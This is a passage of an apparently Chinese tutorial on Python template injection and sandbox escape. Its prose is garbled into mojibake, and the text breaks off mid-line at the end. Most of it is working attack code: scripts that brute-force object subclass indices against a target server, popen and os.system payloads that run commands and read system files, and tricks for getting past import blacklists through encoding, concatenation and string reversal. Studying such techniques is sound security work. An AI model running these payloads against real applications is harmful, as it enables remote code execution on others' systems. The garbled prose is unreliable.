\"__class__\"==\"\\x5f\\x5fclass\\x5f\\x5f\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\" å¯¹äºpython2çš„è¯ï¼Œè¿˜å¯ä»¥åˆ©ç”¨base64è¿›è¡Œç»•è¿‡ \"__class__\"==(\"X19jbGFzc19f\").decode(\"base64\") //è¿™æ˜¯ç¼–ç ç»•è¿‡ 2.8 è„šæœ¬ 1. å¯»æ‰¾å†…å»ºå‡½æ•° eval æ‰§è¡Œå‘½ä»¤ import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__['__builtins__']}}\" res = requests.get(url=url, headers=headers) if 'eval' in res.text: print(i) # å¾—åˆ°ä¸€å¤§å †å­ç±»çš„ç´¢å¼•: æˆ‘ä»¬å¯ä»¥è®°ä¸‹å‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»ï¼š warnings.catch_warnings WarningMessage codecs.IncrementalEncoder codecs.IncrementalDecoder codecs.StreamReaderWriter os._wrap_close reprlib.Repr weakref.finalize ...... 2. å¯»æ‰¾ os æ¨¡å—æ‰§è¡Œå‘½ä»¤ Pythonçš„ os æ¨¡å—ä¸­æœ‰systemå’Œpopenè¿™ä¸¤ä¸ªå‡½æ•°å¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤ã€‚å…¶ä¸­system()å‡½æ•°æ‰§è¡Œå‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨system()å‡½æ•°é…åˆcurlå¤–å¸¦æ•°æ®ï¼›popen()å‡½æ•°æ‰§è¡Œå‘½ä»¤æœ‰å›æ˜¾ã€‚æ‰€ä»¥æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°ä¸ºpopen()å‡½æ•°ï¼Œè€Œå½“popen()å‡½æ•°è¢«è¿‡æ»¤æ‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨system()å‡½æ•°ä»£æ›¿ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰osæ¨¡å—çš„ç±»çš„ç´¢å¼•å·ï¼š import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'os.py' in res.text: print(i) # å¯ä»¥å¾—åˆ°ä¸€å¤§å †ç±» ä½†æ˜¯è¯¥æ–¹æ³•éå†å¾—åˆ°çš„ç±»ä¸å‡†ç¡®ï¼Œå› ä¸ºä¸€äº›ä¸ç›¸å…³çš„ç±»åä¸­ä¹Ÿå­˜åœ¨å­—ç¬¦ä¸² â€œosâ€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦æ¢ç´¢æ›´æœ‰æ•ˆçš„æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æ˜¯ä½¿ç”¨osæ¨¡å—æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¹Ÿæ˜¯è°ƒç”¨çš„osæ¨¡å—ä¸­çš„popenå‡½æ•°ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨popenå‡½æ•°ï¼Œå­˜åœ¨popenå‡½æ•°çš„ç±»ä¸€èˆ¬æ˜¯ os._wrap_closeï¼Œä½†ä¹Ÿä¸ç»å¯¹ã€‚ç”±äºç›®æ ‡Pythonç¯å¢ƒçš„ä¸åŒï¼Œæˆ‘ä»¬è¿˜éœ€è¦éå†ä¸€ä¸‹ã€‚ 3. å¯»æ‰¾ popen å‡½æ•°æ‰§è¡Œå‘½ä»¤ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ popen å‡½æ•°çš„ç±»çš„ç´¢å¼•å·ï¼š import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'popen' in res.text: print(i) # å¾—åˆ°ç¼–å·ä¸º è¿™æ ·å¾—åˆ°çš„ç´¢å¼•è¿˜æ˜¯å¾ˆå‡†ç¡®çš„ã€‚ é™¤äº†è¿™ç§æ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥å¯¼å…¥osæ¨¡å—ï¼Œpythonæœ‰ä¸€ä¸ªimportlibç±»ï¼Œå¯ç”¨load_moduleæ¥å¯¼å…¥ä½ éœ€è¦çš„æ¨¡å—ã€‚ 4. å¯»æ‰¾ importlib ç±»æ‰§è¡Œå‘½ä»¤ Python ä¸­å­˜åœ¨ &lt;class '_frozen_importlib.BuiltinImporter'&gt; ç±»ï¼Œç›®çš„å°±æ˜¯æä¾› Python ä¸­ import è¯­å¥çš„å®ç°ï¼ˆä»¥åŠ __import__ å‡½æ•°ï¼‰ã€‚æˆ‘ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨è¯¥ç±»ä¸­çš„load_moduleå°†osæ¨¡å—å¯¼å…¥ï¼Œä»è€Œä½¿ç”¨ os æ¨¡å—æ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­ importlib ç±»çš„ç´¢å¼•å·ï¼š import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if '_frozen_importlib.BuiltinImporter' in res.text: print(i) 5. å¯»æ‰¾ linecache å‡½æ•°æ‰§è¡Œå‘½ä»¤ linecache è¿™ä¸ªå‡½æ•°å¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¸­ä¹Ÿå¼•å…¥äº† os æ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ª linecache å‡½æ•°å»æ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ linecache è¿™ä¸ªå‡½æ•°çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 6. å¯»æ‰¾ subprocess.Popen ç±»æ‰§è¡Œå‘½ä»¤ ä»python2.4ç‰ˆæœ¬å¼€å§‹ï¼Œå¯ä»¥ç”¨ subprocess è¿™ä¸ªæ¨¡å—æ¥äº§ç”Ÿå­è¿›ç¨‹ï¼Œå¹¶è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯ä¸­å»ï¼Œè¿˜å¯ä»¥å¾—åˆ°å­è¿›ç¨‹çš„è¿”å›å€¼ã€‚ subprocess æ„åœ¨æ›¿ä»£å…¶ä»–å‡ ä¸ªè€çš„æ¨¡å—æˆ–è€…å‡½æ•°ï¼Œæ¯”å¦‚ï¼šos.systemã€os.popen ç­‰å‡½æ•°ã€‚ é¦–å…ˆç¼–å†™è„šæœ¬éå†ç›®æ ‡Pythonç¯å¢ƒä¸­å«æœ‰ linecache è¿™ä¸ªå‡½æ•°çš„å­ç±»çš„ç´¢å¼•å·ï¼š import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36' } for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) å››ã€æ²™ç®±é€ƒé€¸ 4.1 åŸç† æ²™ç›’/æ²™ç®± æ²™ç®±åœ¨æ—©æœŸä¸»è¦ç”¨äºæµ‹è¯•å¯ç–‘è½¯ä»¶ï¼Œæµ‹è¯•ç—…æ¯’å±å®³ç¨‹åº¦ç­‰ç­‰ã€‚åœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œå³ä½¿ç—…æ¯’å¯¹å…¶é€ æˆäº†ä¸¥é‡ å±å®³ï¼Œä¹Ÿä¸ä¼šå¨èƒåˆ°çœŸå®ç¯å¢ƒï¼Œæ²™ç®±é‡æ„ä¹Ÿååˆ†ä¾¿æ·ã€‚æœ‰ç‚¹ç±»ä¼¼è™šæ‹Ÿæœºçš„åˆ©ç”¨ã€‚ æ²™ç®±é€ƒé€¸,å°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹,è„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶,æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚å…¶ å®å°±æ˜¯é—¯è¿‡é‡é‡é»‘åå•ï¼Œæœ€ç»ˆæ‹¿åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæƒé™çš„è¿‡ç¨‹ã€‚è€Œæˆ‘ä»¬è¿™é‡Œä¸»è¦è®²è§£çš„æ˜¯pythonç¯å¢ƒä¸‹çš„ æ²™ç®±é€ƒé€¸ã€‚ pythonçš„æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªä¸¥æ ¼é™åˆ¶çš„pythonç¯å¢ƒä¸­ï¼Œé€šè¿‡ç»•è¿‡é™åˆ¶å’Œè¿‡æ»¤è¾¾åˆ°æ‰§è¡Œæ›´é«˜æƒé™ï¼Œç”šè‡³getshellçš„è¿‡ç¨‹ã€‚ æ—¢ç„¶æ˜¯æƒ³getshellï¼Œæˆ–è€…è¯´æ˜¯æ‰§è¡Œå‘½ä»¤å°±éœ€è¦ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤çš„åŒ…ã€‚å¯ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„æ¨¡å—æœ‰ os pty subprocess plarform commands æœ‰äº›æ—¶å€™ï¼Œæ¯”å¦‚CTFï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å»æ‰§è¡Œå‘½ä»¤ï¼Œè€Œæ˜¯å»è¯»å–ç›®å½•ä¸‹çš„flagæ–‡ä»¶å³å¯ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦æ–‡ä»¶è¯»å–çš„æ¨¡å—æ¥æ‰§è¡Œï¼Œå¸¸ç”¨çš„æ–‡ä»¶è¯»å–æ¨¡å—ï¼š file open codecs fileinput ä¸è¿‡å…¶ä¸­fileåªåœ¨python2ä¸­æ‰§è¡Œï¼Œå·¦2å³3ã€‚ 4.2 å‡½æ•°å¯¼å…¥é™åˆ¶å’Œç»•è¿‡ 1. import ä¸€ä¸ªå—é™åˆ¶çš„ç¯å¢ƒï¼Œç¦æ­¢å¯¼å…¥æ•æ„Ÿçš„åŒ…æ˜¯æœ€å¸¸è§çš„æ–¹æ³•ï¼Œæ‰€ä»¥importä¸€èˆ¬æ˜¯æœ€å®¹æ˜“è¢«é™åˆ¶æ‰ã€‚ import re,sys pattern = re.compile('import\\s+(os|subprocess)') match = re.search(pattern,sys.args[1]) if match: print \"forbidden module import detected\" raise Exception è¿™ç§ç®€å•çš„é™åˆ¶ä¸èƒ½å¯¼å…¥åŒ…çš„å½¢å¼ï¼Œå¯ä»¥ä¸­é—´æ·»åŠ ç©ºæ ¼æ¥ç»•è¿‡ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–æ–¹å¼å¯¼å…¥åŒ…ï¼Œæ¯”å¦‚ __import__ importlib è¿˜å¯ä»¥ä½¿ç”¨ç¼–ç çš„æ–¹å¼ç»•è¿‡å¯¹å¯¼å…¥åŒ…å…³é”®å­—çš„æ£€æŸ¥ï¼Œæ¯”å¦‚ä½¿ç”¨base64ï¼Œpython2ä¸­é€‚ç”¨ &gt;&gt;&gt; import base64 &gt;&gt;&gt; base64.b64encode(\"os\") 'b3M=' &gt;&gt;&gt; flag = __import__(base64.b64decode('b3M=')) &gt;&gt;&gt; flag.system('whoami') misaki\\user æˆ–è€… &gt;&gt;&gt; import importlib &gt;&gt;&gt; flag = importlib.import_module('b3M='.decode('base64')) &gt;&gt;&gt; flag.system('whoami') misaki\\user æˆ–è€…ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ &gt;&gt;&gt; __import__('o'+'s').system('who'+'ami') å­—ç¬¦ä¸²fç¿»è½¬æˆªå– &gt;&gt;&gt; __import__('so'[::-1]).system('whoami') misaki\\user &gt;&gt;&gt; exec(')\"imaohw\"(metsys.so ;so tropmi'[::-1]) misaki\\user å†ä¸‡ä¸€ï¼Œä»–æ˜¯è¿™ä¹ˆç¦æ­¢çš„ import re,sys pattern = re.compile('import') match = re.search(pattern,sys.args[1]) if match: print \"forbidden module import detected\" raise Exception è¿™æ ·çš„è¯ï¼Œä¸ç®¡æ€ä¹ˆæ¢å¯¼å…¥å‡½æ•°éƒ½ä¼šè¢«ç¦æ­¢ã€‚é‚£ä¹ˆæ˜¯å¦æœ‰ä¸ç›´æ¥ä½¿ç”¨importå…³é”®å­—æ¥å¯¼å…¥çš„æ–¹å¼ã€‚æ—¢ç„¶éœ€è¦å¯¼å…¥ä¹Ÿå°±æ˜¯åªéœ€è¦èƒ½æ‰§è¡Œå¯¹åº”çš„åº“å°±å¯ä»¥ã€‚ ä½¿ç”¨execfileï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰éœ€è¦åˆ¤æ–­å¾—åˆ°åº“çš„ç‰©ç†è·¯å¾„ã€‚å¦‚æœsysæ¨¡å—æ²¡è¢«ç¦ç”¨çš„è¯ï¼Œå°±å¯ä»¥ä½¿ç”¨sysæ¥è·å–ç‰©ç†è·¯å¾„ã€‚è¿™ç§æ–¹å¼åªèƒ½ç”¨åœ¨python2ä¸­ï¼Œpython3å–æ¶ˆäº†execfile &gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py') #Linuxç³»ç»Ÿä¸‹é»˜è®¤è·¯å¾„ &gt;&gt;&gt; system('whoami') misaki python3å¯ä»¥åˆ©ç”¨è¯»å–æ–‡ä»¶ï¼Œé…åˆexecæ¥æ‰§è¡Œ &gt;&gt;&gt; f = open(r'/usr/lib/python3.6/os.py','r') &gt;&gt;&gt; exec(f.read()) &gt;&gt;&gt; system('whoami') misaki #ä¸å¯ä»¥æ‰§è¡Œåˆ©ç”¨execæ‰“å¼€è¯»å–ï¼Œexecéœ€è¦æ‰§è¡Œçš„æ˜¯å…¶ä¸­çš„å†…å®¹ï¼Œç›´æ¥æ‰“å¼€çš„æ—¶å€™execæ‰§è¡Œçš„å°±æ˜¯è¯»å–æ–‡ä»¶æ“ä½œ exec(\"open('/usr/lib/python3.6/os.py','r').read()\") ä½¿ç”¨with opençš„å½¢å¼ &gt;&gt;&gt; with open('/usr/lib/python3.6/os.py','r') as f: ... exec(f.read()) ... &gt;&gt;&gt; system('whoami') misaki æˆ–è€…ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œä½†æ˜¯éœ€è¦è·Ÿexecï¼Œevalä¸€èµ·åˆ©ç”¨ã€‚ &gt;&gt;&gt; exec('imp'+'ort'+' '+'os;'+'os.system(\"whoami\")') misaki\\user è¿™é‡Œexecä¸éœ€è¦å¯¼å…¥å°±å¯ä»¥ç›´æ¥å¼•ç”¨ï¼Œå½“ç„¶ä¸éœ€è¦å¯¼å…¥å°±å¯ä»¥å¼•ç”¨çš„å‡½æ•°ä¸æ­¢è¿™ä¸€ä¸ªï¼Œå› ä¸ºä¸€ä¸ªå†…å»ºå‡½æ•°çš„åŸå› ã€‚ 2. builtins __builtins__å³æ—¶å¼•ç”¨ï¼Œåœ¨ç¨‹åºè¿˜ä¸ºæ‰§è¡Œä»£ç çš„æ—¶å€™å°±å·²ç»åŠ è½½è¿›æ¥äº†ã€‚æ­¤æ¨¡å—å¹¶ä¸éœ€è¦å¯¼å…¥ï¼Œå¯ä»¥åœ¨ä»»ä½•æ¨¡å—ä¸­æ‰§è¡Œå¼•ç”¨ã€‚æ¯”å¦‚åœ¨python2ä¸­ åœ¨python3ä¸­ æ‰€ä»¥æˆ‘ä»¬é€šè¿‡dictå±æ€§æ¥è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œä¾‹å¦‚å¦‚ä¸‹è°ƒç”¨execæ¥æ‰§è¡Œå…¶ä¸­çš„pythonè¯­å¥ã€‚ &gt;&gt;&gt; __builtins__.__dict__['exec'](\"print('ok')\") ok é€šè¿‡å†…å»ºå‡½æ•°æ¥å¯¼å…¥åŒ… &gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami') misaki\\user ä¸‡ä¸€è·Ÿä¸Šé¢ä¸€æ ·ï¼Œç¦ç”¨äº†importï¼Œå½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨æ‹¼æ¥çš„æ–¹å¼ &gt;&gt;&gt; __builtins__.__dict__['__imp'+'ort__']('os').system('whoami') misaki\\user å¦‚æœåœ¨__builtins__ä¸­ï¼Œéƒ¨åˆ†éœ€è¦å¼•ç”¨çš„å‡½æ•°è¢«åˆ é™¤ã€‚ä¸èƒ½ç›´æ¥ç”¨dictå±æ€§æ¥è°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨reloadæ¥é‡æ–°åŠ è½½ reload(__builtin__) å¦‚æœä»”ç»†çœ‹ä¸Šé¢çš„å›¾ç‰‡å°±å¯ä»¥çœ‹åˆ°ï¼Œåœ¨python2ä¸­reloadä¹Ÿæ˜¯__builtin__çš„å†…å»ºå‡½æ•°ã€‚å¦‚æœæ­¤å‡½æ•°è¢«åˆ é™¤åœ¨python2ä¸­ä¹Ÿä¸å¯ä»¥ç›´æ¥å¼•ç”¨äº†ã€‚python3ä¸­reloadä¸å†æ˜¯å†…å»ºå‡½æ•°ï¼Œ3.4ä¹‹å‰æ˜¯impæ¨¡å—ä¸‹çš„å‡½æ•°ï¼Œè€Œä¹‹åæ˜¯importlibæ¨¡å—ä¸‹çš„å‡½æ•°ã€‚ æ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨impæ¨¡å—æ¥å¯¼å…¥ï¼Œpython2ä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚ &gt;&gt;&gt; import imp &gt;&gt;&gt; imp.reload(__builtins__) &lt;module '__builtin__' (built-in)&gt; åœ¨æ‰€ä¸Šçš„å¯¼å…¥æ¨¡å—ä¸­ï¼Œç³»ç»Ÿçš„åŒ…éƒ½åœ¨ä¸€ä¸ªé»˜è®¤è·¯å¾„ä¸‹ï¼Œè¢«sysçš„moduleså­˜å‚¨è®°å½•ã€‚å¦‚æœæŠŠå…¶ä¸­çš„osæ¨¡å—åˆ é™¤å°±ä¸èƒ½å†å»åŠ è½½osæ¨¡å—äº†ï¼Œè¿™æ—¶å€™éœ€è¦æ‰‹åŠ¨æŠŠosé‡æ–°åŠ è½½è¿›å»ã€‚ä¸€èˆ¬å°è¯•é»˜è®¤è·¯å¾„ï¼Œæˆ–è€…sysæŸ¥çœ‹å­˜å‚¨è·¯å¾„ &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules['os']='/usr/lib/python3.6/os.py' &gt;&gt;&gt; import os 3. é­”æ³•å‡½æ•° pythonæ²™ç®±é€ƒé€¸è¿˜æ˜¯ç¦»ä¸å¼€ç»§æ‰¿å…³ç³»å’Œå­çˆ¶ç±»å…³ç³»ï¼Œåœ¨æŸ¥çœ‹å’Œä½¿ç”¨ç±»çš„ç»§æ‰¿ï¼Œé­”æ³•å‡½æ•°èµ·åˆ°äº†ä¸å¯æ¯”æ‹Ÿçš„ä½œç”¨ã€‚ å…ˆçœ‹çœ‹å‡ ä¸ªå¸¸ç”¨çš„é­”æ³•å‡½æ•° __class__ è¿”å›è°ƒç”¨çš„ç±»å‹ class A(): pass a = A() print(a.__class__) #&lt;class '__main__.A'&gt; __mro__ æŸ¥çœ‹ç±»ç»§æ‰¿çš„æ‰€æœ‰çˆ¶ç±»ï¼Œç›´åˆ°object class A: pass class B(A): pass class C(A): pass class D(B, C): pass print(D.__mro__) #(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class 'object'&gt;) __subclasses__ è·å–ç±»çš„æ‰€æœ‰å­ç±» class A(object): pass class B(A): pass class C(A): pass print(A.__subclasses__()) #[&lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;] __bases__ è¿”å›æ‰€æœ‰ç›´æ¥çˆ¶ç±»ç»„æˆçš„å…ƒç»„ class A(object): pass class B(A): pass print(B.__bases__) #(&lt;class '__main__.A'&gt;,) ä¸è¿”å›objectç±» __init__ ç±»å®ä¾‹åˆ›å»ºä¹‹åè°ƒç”¨, å¯¹å½“å‰å¯¹è±¡çš„å®ä¾‹çš„ä¸€äº›åˆå§‹åŒ– class A: def __init__(self): print('ok') a = A() # è¾“å‡ºok __globals__ èƒ½å¤Ÿè¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ class A(object): def __init__(self, a, b): self.a = a self.b = b a.__init__.__globals__ {'A': &lt;class '__main__.A'&gt;, 'a': &lt;__main__.A object at 0x0000000001692390&gt;, 'importlib': &lt;module 'importlib' from 'D:\\anaconda\\lib\\importlib\\__init__.pyc'&gt;, '__builtins__': &lt;module '__builtin__' (built-in)&gt;, 'pattern': &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, 'base64': &lt;module 'base64' from 'D:\\anaconda\\lib\\base64.pyc'&gt;, 'sys': &lt;module 'sys' (built-in)&gt;, 'flag': &lt;module 'os' from 'D:\\anaconda\\lib\\os.pyc'&gt;, '__package__': None, 'os': &lt;module 'os' from 'D:\\anaconda\\lib\\os.pyc'&gt;,'__doc__': None, 'match': &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;} __getattribute__ å½“ç±»è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ— æ¡ä»¶è¿›å…¥æ­¤å‡½æ•°ã€‚ __getattr__ å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æ—¶è°ƒç”¨ class A: def __init__(self): self.name = \"Bob\" def __getattribute__(self,item): print(\"ok\") a = A() a.name #ok, è¿™æ—¶å€™ä¸ç®¡è°ƒç”¨ä»€ä¹ˆå±æ€§éƒ½ä¼šè¿”å›okï¼Œç›¸å½“äºæ‹¦æˆªäº†å±æ€§è°ƒç”¨ã€‚ def __getattr__(self): print('getattr') a.age #getattr è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§ä¼šæ‰§è¡Œï¼Œç›¸å½“äºå¤„ç†äº†AttributeErrorã€‚ 4. ç±»ç»§æ‰¿ä½¿ç”¨ å°è¯•åˆ©ç”¨ç»§æ‰¿å…³ç³»æ¥æ‰¾åˆ°objectç±» \"\".__class__.__bases__ #(&lt;class 'object'&gt;,) å‰é¢ä¸ä»…å¯ä»¥ä½¿ç”¨åŒå¼•å·ï¼Œè¿˜å¯ä»¥åˆ©ç”¨åˆ—è¡¨æˆ–è€…å­—å…¸ç±»å‹ï¼ŒåŒºåˆ«åœ¨æŸ¥æ‰¾ç±»å‹çš„æ—¶å€™åœ¨ä¸åŒçš„åŸºç¡€ä¸ŠæŸ¥æ‰¾ï¼Œè¿”å›éƒ½æ˜¯å…ƒç»„ã€‚ [].__class__.__bases__ {}.__class__.__bases__ åœ¨objectç±»ä¸‹å»æŸ¥æ‰¾æ‰€æœ‰çš„å­ç±»ï¼Œç„¶åå»æŸ¥æ‰¾å¯åˆ©ç”¨ç±»ï¼Œ__bases__è¿”å›æ˜¯å…ƒç»„ï¼Œä½¿ç”¨ä¸‹æ ‡è·å¾—objectç±»ã€‚ \"\".__class__.__bases__[0].__subclasses__() æ‰¾åˆ°éœ€è¦ä½¿ç”¨çš„ç±»ï¼Œå…¶ä¸­æœ‰å¯ä»¥ä½¿ç”¨çš„ç±»ï¼Œåœ¨python3ä¸­ä½¿ç”¨ &lt;class 'os._wrap_close'&gt;,&lt;class 'warnings.WarningMessage'&gt; è°ƒç”¨ä»–ä»¬ &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[128] &lt;class 'os._wrap_close'&gt; &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[177] &lt;class 'warnings.WarningMessage'&gt; å¦‚æœå­ç±»è¿‡å¤šï¼Œä¸å¥½æŸ¥æ‰¾æ˜¯ç¬¬å‡ ä¸ªä¸‹æ ‡ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ¥æ ‡è®° for i in enumerate(\"\".__class__.__bases__[0].__subclasses__()): print i å…ˆæ¥è¯»å–ä¸€ä¸‹æ–‡ä»¶ï¼ŒCç›˜ä¸‹çš„win.iniæ–‡ä»¶ \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__ ä»ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰å…³äºæ–‡ä»¶è¯»å–çš„æ–¹æ³•ï¼Œæ¯”å¦‚openï¼Œfileå‡½æ•°ã€‚åœ¨æœ€åæ‰¾åˆ°ä¸€ä¸ªpopenå‡½æ•°ã€‚ \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen'](\"C:\\\\windows\\\\win.ini\").read() #å¦‚æœè¿™é‡Œä¼šæŠ¥é”™æ·»åŠ __builtins__ \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['popen'](\"C:\\\\windows\\\\win.ini\").read() å¦‚æœæƒ³ç›´æ¥åœ¨ç»ˆç«¯æ˜¾ç¤ºå‡ºæ¥ \"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen'](\"type C:\\\\windows\\\\win.ini\").read() åœ¨python2ä¸­å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å½¢å¼è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œåœ¨python2ä¸­å‰é¢æ˜¯å¦å­—ç¬¦ä¸²è¿˜æ˜¯å…ƒç»„æˆ–è€…å­—å…¸å¯¹åé¢ç±»çš„æŸ¥æ‰¾æœ‰ä¸ä¸€æ ·çš„ç»“æœã€‚ ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].getline(\"C:\\\\windows\\\\win.ini\",1) æ‰§è¡Œå‘½ä»¤ &gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('whoami' )misaki\\user ä½†æ˜¯python2å¦‚æœä½¿ç”¨å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼Œå› ä¸º__bases__è·å–çš„å¹¶ä¸æ˜¯objectç±» &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[59] Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; IndexError: list index out of range åªéœ€è¦å†å»è·å¾—ä¸€æ¬¡å³å¯ &gt;&gt;&gt; \"\".__class__.__bases__[0].__bases__[0].__subclasses__()[59] &lt;class 'warnings.WarningMessage'&gt; 5. ç‰¹æ®Šå‡½æ•°æŸ¥æ‰¾ 5.1 python3 åœ¨GitHubçš„pythoné¡µé¢ä¸ŠæŠŠè‡ªå¸¦å‡½æ•°å…¨éƒ¨è·å–ç›®å‰çš„3.8çš„æ¨¡å—(202) asyncio collections concurrent ctypes curses dbm distutils email encodings ...... warnings.py wave.py weakref.py webbrowser.py xdrlib.py zipapp.py zipfile.py zipimport.py å°†è¿™ä¹ˆæ¨¡å—è¿›è¡Œç­›é€‰ï¼Œè§„åˆ™è¿™äº›æ¨¡å—å“ªäº›æœ‰è°ƒç”¨ä¸Šé¢æåˆ°çš„æ¨¡å—ï¼Œæˆ–è€…æ–‡ä»¶è¯»å–ç­‰æ–¹æ³•ã€‚ # coding=UTF-8 import codecs from collections import defaultdict with codecs.open('python.txt', 'r', encoding='UTF-8') as f: modules = f.readlines() modules = [m.strip().replace('.py', '') for m in modules] target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys', 'commands'] target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open', 'codecs'] all_targets 